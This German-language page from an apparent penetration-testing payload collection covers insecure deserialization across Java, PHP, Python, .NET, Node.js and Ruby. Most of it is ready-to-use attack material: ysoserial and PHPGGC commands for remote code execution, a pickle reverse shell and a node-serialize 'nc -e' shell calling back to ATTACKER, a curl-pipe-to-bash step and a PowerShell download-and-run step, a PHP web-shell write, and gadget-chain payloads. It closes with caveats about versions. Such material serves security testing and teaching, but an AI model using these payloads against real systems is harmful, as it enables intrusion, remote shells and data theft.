# 🔓 Payloads zur Deserialisierung

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Deserialisierung in Java

### Erkennung
```
# Kennbytes (Magic Bytes)
AC ED 00 05    # Serialisiertes Java-Objekt (Base64: rO0AB)
H4sIAAAA       # GZip-komprimiert

# Häufige Fundstellen
- Cookies (Base64-kodiert)
- Verborgene Formularfelder
- ViewState
- API-Parameter
- RMI (port 1099)
- JMX (port 9010)
```

### ysoserial – Payload-Generator
```bash
# Installieren
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Payload erzeugen
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Häufige Gadget-Ketten
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Payload für DNS-Exfiltration
```bash
# Payload für einen DNS-Callback erzeugen
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# DNS-basierte Erkennung
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Häufig betroffene Bibliotheken
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 Deserialisierung in PHP

### Magische Methoden
```php
__construct()    // Object creation
__destruct()     // Object destruction
__wakeup()       // Unserialization
__sleep()        // Serialization
__toString()     // Object to string
__call()         // Inaccessible method
__get()          // Inaccessible property read
__set()          // Inaccessible property write
```

### Grundlegende Payload
```php
// Format eines serialisierten Objekts
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Objekt mit Eigenschaften
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Array
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Typumwandlung bei Vergleichen (Type Juggling)
```php
// Umgehung mit booleschem true
O:4:"User":1:{s:8:"password";b:1;}

// Vergleich mit der Ganzzahl 0
O:4:"User":1:{s:8:"password";i:0;}

// Umgehung über einen Array-Vergleich
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Payloads für POP-Ketten
```php
// Beliebige Datei schreiben
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Befehlsausführung über __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC – PHP-Gadget-Ketten
```bash
# Installieren
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Gadgets auflisten
./phpggc -l

# Payload erzeugen
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Mit Base64 kodieren
./phpggc -b Laravel/RCE1 system "id"

# URL-kodieren
./phpggc -u Laravel/RCE1 system "id"

# Mit Wrapper (PHAR)
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Phar-Deserialisierung
```php
// Der Zugriff auf Phar-Dateien kann laut Vorlage eine Deserialisierung auslösen
phar://path/to/phar.phar/internal-file

// Zugriffsmethoden mit phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Deserialisierung in Python (Pickle)

### Grundlegende Payload
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Reverse-Shell-Payload
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Erkennung
```
# Kennbytes (Magic Bytes)
80 04 95    # Protokoll 4 (Python 3)
80 03       # Protokoll 3
80 02       # Protokoll 2

# Häufige Base64-Muster
gASV        # Protokoll 4
gAN         # Protokoll 3
```

### YAML-Deserialisierung (Python)
```yaml
# Unsicheres Laden mit PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Mehrere Befehle
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 Deserialisierung in .NET

### Erkennung
```
# ViewState
Parameter __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Base64-Kennmuster

# JSON.NET
Feld $type in JSON
```

### ysoserial.net – Payload-Generator
```powershell
# Herunterladen
# https://github.com/pwntester/ysoserial.net

# Payload erzeugen
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Häufige Gadgets
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Ausnutzung von ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Verwundbarer Code: unserialize(user_input)
// Payload mit IIFE (sofort aufgerufener Funktionsausdruck)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Reverse Shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Falls eval() auf deserialisierte Daten angewendet wird
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Deserialisierung in Ruby

### Marshal.load
```ruby
# Payload erstellen
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Testcheckliste

```markdown
□ Serialisierungsformat erkennen (Base64, Hex, Kennbytes)
□ Sprache beziehungsweise Framework bestimmen (Java, PHP, Python, .NET)
□ Verwundbare Bibliotheksversionen ermitteln
□ Payloads mit einem passenden Werkzeug erzeugen
□ Blinde Prüfung mit DNS-/HTTP-Callbacks
□ Lese- und Schreibzugriff auf Dateien prüfen
□ Auf Codeausführung prüfen
□ Unterschiedliche Gadget-Ketten prüfen
□ Filter umgehen (Kodierung, Kompression)
```

---

## 🔗 Werkzeugübersicht

| Sprache | Werkzeug | Verwendung |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Eigene Lösung | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Eigene Lösung | Payload manuell erstellen |

---

## 🔗 Verwandte Payloads

- [SSTI-Payloads](./SSTI.de.md)
- [Command Injection](./Command-Injection.de.md)

---

**Zurück zur Payload-Sammlung:** 💉 Payload-Sammlung (im Original verlinkt; `Payloads/README.md` fehlt)

---

---

## Hinweise zur deutschen Ausgabe

> **Versionen und Voraussetzungen:** Eine Gadget-Kette setzt die passenden Klassen, Bibliotheken, Einstellungen und einen erreichbaren Deserialisierungspfad voraus. Kennbytes und Base64-Präfixe sind Hinweise, keine belastbare Erkennung eines verwundbaren Systems. Serialisierte Längenfelder und Beispielobjekte müssen zum tatsächlich erzeugten Datenstrom passen; die Beispiele bleiben wörtlich erhalten.

> **Phar und Laufzeiten:** Seit PHP 8.0 werden Phar-Metadaten beim bloßen Zugriff über den Stream-Wrapper nicht mehr automatisch deserialisiert. Die allgemeine Trigger-Aussage ist daher historisch. Python-Pickle kann bei der Deserialisierung Code ausführen; das macht jedoch nicht jeden Beispielimport zu einem nachgewiesenen Anwendungspfad. In .NET 9 ist die mitgelieferte BinaryFormatter-Implementierung entfernt und die API wirft beim Aufruf. [PHP-8-Migration](https://www.php.net/manual/en/migration80.incompatible.php), [Python: pickle](https://docs.python.org/3/library/pickle.html), [Microsoft: BinaryFormatter in .NET 9](https://learn.microsoft.com/en-us/dotnet/core/compatibility/serialization/9.0/binaryformatter-removal).
